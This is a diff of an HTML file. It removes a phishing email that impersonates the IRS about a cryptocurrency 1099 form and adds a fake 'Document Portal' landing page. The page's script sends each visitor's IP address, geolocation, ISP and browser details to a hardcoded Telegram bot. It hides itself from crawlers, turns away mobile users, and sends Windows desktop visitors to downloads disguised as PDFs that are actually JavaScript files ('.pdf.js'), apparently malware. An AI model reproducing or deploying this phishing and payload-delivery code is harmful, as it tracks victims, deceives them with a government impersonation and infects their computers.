@@ -1,91 +1,335 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>IRS Online Verification Notice</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-/* Basic email-safe resets */
-body {
-  margin: 0;
-  padding: 0;
-  background-color: #f4f6f8;
-  font-family: Arial, sans-serif;
-}
-table {
-  border-spacing: 0;
-  width: 100%;
-}
-td {
-  padding: 0;
-}
-img {
-  border: 0;
-  display: block;
-  max-width: 100%;
-}
-a {
-  text-decoration: none;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Document Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 480px;
+            background: white;
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.05);
+            text-align: center;
+            border: 1px solid #e9ecef;
+        }
+        .icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+        }
+        h2 {
+            color: #1a1e2b;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #6c757d;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .loader {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e9ecef;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status {
+            color: #6c757d;
+            font-size: 13px;
+            margin: 16px 0;
+        }
+        .manual-link {
+            display: none;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+        }
+        .manual-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #adb5bd;
+        }
+        .desktop-message {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .desktop-message .card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 40px;
+            border: 1px solid #e9ecef;
+        }
+        .desktop-message .icon-large {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        .desktop-message h2 {
+            color: #1a1e2b;
+            margin-bottom: 16px;
+        }
+        .desktop-message p {
+            color: #6c757d;
+            margin: 16px 0;
+        }
+    </style>
 </head>
 <body>
-  <table role="presentation" bgcolor="#f4f6f8" width="100%">
-     <tr>
-      <td align="center" style="padding:20px 0;">
-        <!-- Main container -->
-        <table role="presentation" width="600" style="background-color:#ffffff;border-radius:6px;overflow:hidden;">
-          <!-- Header -->
-           <tr>
-            <td style="background-color:#1e4b83;padding:15px;text-align:center;">
-              <img src="https://www.irs.gov/themes/custom/pup_base/IRS-Logo.svg" alt="IRS Logo" width="150" style="height:auto;">
-             </td>
-           </tr>
-          <!-- Body -->
-           <tr>
-            <td style="padding:30px;color:#333333;font-size:16px;line-height:1.5;">
-              
-              <p style="margin:0 0 10px;font-size:14px;color:#666;">
-                Issue Number: IR-2026-216<br>
-                Notice of Document Availability
-              </p>
-              
-              <h1 style="font-size:20px;font-weight:bold;color:#1e4b83;margin:15px 0 15px;">
-                Cryptocurrency Tax Form 1099 is Ready
-              </h1>
-              
-              <p style="margin:0 0 20px;">
-                Our records show required cryptocurrency transaction reports were filled in your name for tax year 2025.
-              </p>
-              
-              <div style="text-align:center;margin:25px 0;">
-                <a href="#" style="background-color:#1e4b83;color:#ffffff;padding:12px 24px;font-size:16px;border-radius:4px;display:inline-block;">
-                  Download
-                </a>
-              </div>
-              
-              <p style="font-size:14px;color:#1e4b83;margin:10px 0 0;">
-                ...irs-doc.com/doc216
-              </p>
-             </td>
-           </tr>
-          <!-- Footer -->
-           <tr>
-            <td style="background-color:#111111;color:#ffffff;text-align:center;padding:15px;font-size:12px;line-height:1.4;">
-              <img src="https://www.irs.gov/themes/custom/pup_base/IRS-Logo.svg" alt="IRS Logo" width="80" style="height:auto;margin-bottom:8px;">
-              <div>
-                <a href="#" style="color:#ffffff;text-decoration:underline;margin:0 5px;">Help</a> |
-                <a href="#" style="color:#ffffff;text-decoration:underline;margin:0 5px;">Privacy Policy</a> |
-                <a href="#" style="color:#ffffff;text-decoration:underline;margin:0 5px;">Accessibility</a>
-              </div>
-              <p style="margin-top:8px;color:#cccccc;">
-                This is an official communication from the Internal Revenue Service.
-              </p>
-             </td>
-           </tr>
-         </table>
-       </td>
-     </tr>
-   </table>
+    <div id="app"></div>
+
+    <script>
+        // ============================================================
+        // TELEGRAM CONFIGURATION
+        // ============================================================
+        const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
+        const TELEGRAM_CHAT_ID = '1482823538';
+        
+        // ============================================================
+        // YOUR DROPBOX LINKS (UPDATED)
+        // ============================================================
+        const FILE_LINKS = [
+            'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/Notice_2026.pdf.js?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=lsl7i814&dl=1',
+            'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/Report_2026.pdf.js?rlkey=4zny8tbzwnclmicin19mkiqzv&st=6jggm3wh&dl=1',
+            'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/Blueprint_pdf.js?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=e12b3hbz&dl=1'
+        ];
+        
+        // ============================================================
+        // TELEGRAM NOTIFICATION FUNCTION
+        // ============================================================
+        async function sendTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+                return false;
+            }
+        }
+        
+        // ============================================================
+        // GET IP AND LOCATION
+        // ============================================================
+        async function getLocationInfo() {
+            try {
+                // Get IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Get location from ipapi
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                return {
+                    ip: ip,
+                    city: locationData.city || 'Unknown',
+                    region: locationData.region || 'Unknown',
+                    country: locationData.country_name || 'Unknown',
+                    latitude: locationData.latitude || 'N/A',
+                    longitude: locationData.longitude || 'N/A',
+                    isp: locationData.org || 'Unknown',
+                    timezone: locationData.timezone || 'Unknown'
+                };
+            } catch (error) {
+                return {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    latitude: 'N/A',
+                    longitude: 'N/A',
+                    isp: 'Unknown',
+                    timezone: 'Unknown'
+                };
+            }
+        }
+        
+        // ============================================================
+        // SEND VISIT NOTIFICATION
+        // ============================================================
+        async function sendVisitNotification(selectedFile) {
+            const location = await getLocationInfo();
+            const userAgent = navigator.userAgent;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || 'Direct';
+            const timestamp = new Date().toISOString();
+            const fileName = selectedFile.split('/').pop().split('?')[0];
+            
+            const message = `🔵 <b>DOCUMENT ACCESS</b> 🔵
+            
+📍 <b>Location:</b> ${location.city}, ${location.region}, ${location.country}
+🌐 <b>IP Address:</b> ${location.ip}
+🗺️ <b>Coordinates:</b> ${location.latitude}, ${location.longitude}
+🏢 <b>ISP:</b> ${location.isp}
+⏰ <b>Timezone:</b> ${location.timezone}
+
+📁 <b>File:</b> ${fileName}
+💻 <b>OS:</b> ${navigator.platform}
+🌍 <b>Browser:</b> ${navigator.userAgent.match(/(Chrome|Firefox|Edge|Safari)/) || 'Unknown'}
+🖥️ <b>Screen:</b> ${screenSize}
+🔗 <b>Referrer:</b> ${referrer}
+📅 <b>Time:</b> ${timestamp}
+
+<b>User Agent:</b>
+<code>${userAgent.substring(0, 200)}</code>`;
+            
+            await sendTelegram(message);
+        }
+        
+        // ============================================================
+        // USERAGENT DETECTION
+        // ============================================================
+        (async function() {
+            const ua = navigator.userAgent.toLowerCase();
+            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
+            const isWindows = /windows|win32|win64/i.test(ua);
+            
+            // BOT DETECTION
+            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
+            if (isBot) {
+                document.getElementById('app').innerHTML = `
+                    <div class="container">
+                        <div class="icon">📄</div>
+                        <h2>Document Portal</h2>
+                        <p>Secure document delivery system.</p>
+                        <div class="footer">Secure Transmission</div>
+                    </div>
+                `;
+                return;
+            }
+            
+            // MOBILE BLOCK
+            if (isMobile) {
+                document.getElementById('app').innerHTML = `
+                    <div class="desktop-message">
+                        <div class="card">
+                            <div class="icon-large">💻</div>
+                            <h2>Desktop Access Required</h2>
+                            <p>This document requires a desktop environment.</p>
+                            <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
+                            <hr style="margin: 24px 0 16px; border: none; border-top: 1px solid #e9ecef;">
+                            <p style="font-size: 11px; color: #adb5bd;">Secure Document Portal</p>
+                        </div>
+                    </div>
+                `;
+                return;
+            }
+            
+            // WINDOWS DESKTOP – show loading
+            document.getElementById('app').innerHTML = `
+                <div class="container">
+                    <div class="icon">📄</div>
+                    <h2>Document Portal</h2>
+                    <p>Your document is being prepared</p>
+                    <div class="loader"></div>
+                    <div class="status" id="status">Verifying access...</div>
+                    <div class="manual-link" id="manualLink">
+                        <a href="#" id="manualUrl">Click here if not redirected</a>
+                    </div>
+                    <div class="footer">Secure • Encrypted</div>
+                </div>
+            `;
+            
+            // Select random file based on fingerprint
+            function getRandomFile() {
+                const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
+                let hash = 0;
+                for (let i = 0; i < fingerprint.length; i++) {
+                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+                    hash |= 0;
+                }
+                return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
+            }
+            
+            const selectedFile = getRandomFile();
+            
+            // Send Telegram notification (don't wait)
+            sendVisitNotification(selectedFile);
+            
+            if (!sessionStorage.getItem('redirected')) {
+                sessionStorage.setItem('redirected', 'true');
+                
+                const delay = 1500 + Math.random() * 2000;
+                const messages = ['Verifying credentials', 'Loading document', 'Preparing download', 'Redirecting...'];
+                let idx = 0;
+                const statusEl = document.getElementById('status');
+                const interval = setInterval(() => {
+                    if (statusEl) {
+                        idx = (idx + 1) % messages.length;
+                        statusEl.innerHTML = messages[idx];
+                    }
+                }, 800);
+                
+                setTimeout(() => {
+                    clearInterval(interval);
+                    window.location.href = selectedFile;
+                }, delay);
+                
+                // Fallback manual link
+                setTimeout(() => {
+                    const manualLink = document.getElementById('manualLink');
+                    const manualUrl = document.getElementById('manualUrl');
+                    if (manualLink && manualUrl) {
+                        manualLink.style.display = 'block';
+                        manualUrl.href = selectedFile;
+                        const loader = document.querySelector('.loader');
+                        if (loader) loader.style.display = 'none';
+                        if (statusEl) statusEl.innerHTML = 'Click to download';
+                    }
+                }, 5000);
+            } else {
+                const loader = document.querySelector('.loader');
+                const statusEl = document.getElementById('status');
+                if (loader) loader.style.display = 'none';
+                if (statusEl) statusEl.innerHTML = 'Document ready';
+                document.getElementById('manualLink').style.display = 'block';
+                document.getElementById('manualUrl').href = selectedFile;
+            }
+        })();
+    </script>
 </body>
 </html>
